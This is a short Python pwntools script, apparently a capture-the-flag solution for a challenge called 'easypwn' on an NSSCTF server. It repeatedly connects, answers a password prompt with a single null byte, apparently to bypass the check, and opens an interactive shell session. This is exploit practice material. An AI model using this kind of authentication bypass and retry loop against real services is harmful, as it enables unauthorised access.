from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])


while True:
    try:
        # io=process("./easypwn")
        io=remote("node5.anna.nssctf.cn",28637)
        io.recvuntil(b"Password:\n")
        io.sendline(b"\x00")
        io.recvline()
        io.recvline()
        io.interactive()
    except:
        io.close()
        continue